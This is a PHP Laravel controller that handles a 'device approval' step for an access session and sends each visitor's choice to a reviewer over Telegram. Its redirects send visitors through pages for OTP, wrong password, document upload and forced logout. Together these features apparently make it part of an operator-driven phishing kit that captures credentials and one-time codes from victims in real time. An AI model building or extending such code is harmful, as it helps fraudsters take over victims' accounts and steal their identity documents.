<?php

namespace App\Http\Controllers;

use App\Models\AccessSession;
use App\Services\TelegramService;
use App\Support\AccessSessionResolver;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\View\View;

class ApproveDeviceController extends Controller
{
    public function show(Request $request): View|RedirectResponse
    {
        $session = AccessSessionResolver::current($request);

        if (! AccessSessionResolver::isActive($session)) {
            return redirect()->route('force-logout');
        }

        if ($redirect = $this->leaveIfNeeded($session)) {
            return $redirect;
        }

        if (! in_array($session->status, [
            AccessSession::STATUS_DEVICE,
            AccessSession::STATUS_DEVICE_REVIEW,
        ], true)) {
            return redirect()->route('waiting');
        }

        $session->touchSeen();

        return view('approve-device', [
            'session' => $session,
            'review' => $session->status === AccessSession::STATUS_DEVICE_REVIEW,
        ]);
    }

    public function store(Request $request, TelegramService $telegram): RedirectResponse
    {
        $session = AccessSessionResolver::current($request);

        if (! AccessSessionResolver::isActive($session)) {
            return redirect()->route('force-logout');
        }

        if ($session->status !== AccessSession::STATUS_DEVICE) {
            return redirect()->route('approve-device');
        }

        $data = $request->validate([
            'choice' => ['required', 'in:approve,later'],
        ]);

        $session->submitDeviceChoice($data['choice']);
        $telegram->notifyReview(
            $session->fresh(),
            'Device Choice',
            $data['choice'] === 'approve' ? 'Approve' : 'Lain kali'
        );

        return redirect()->route('approve-device');
    }

    protected function leaveIfNeeded(AccessSession $session): ?RedirectResponse
    {
        return match ($session->status) {
            AccessSession::STATUS_WAITING => redirect()->route('waiting'),
            AccessSession::STATUS_OTP, AccessSession::STATUS_OTP_REVIEW,
            AccessSession::STATUS_AUTH, AccessSession::STATUS_AUTH_REVIEW => redirect()->route('otp'),
            AccessSession::STATUS_PASSWORD, AccessSession::STATUS_PASSWORD_REVIEW => redirect()->route('password-wrong'),
            AccessSession::STATUS_DOCUMENT => redirect()->route('upload-document'),
            AccessSession::STATUS_LOGOUT, AccessSession::STATUS_CLOSED => redirect()->route('force-logout'),
            default => null,
        };
    }
}
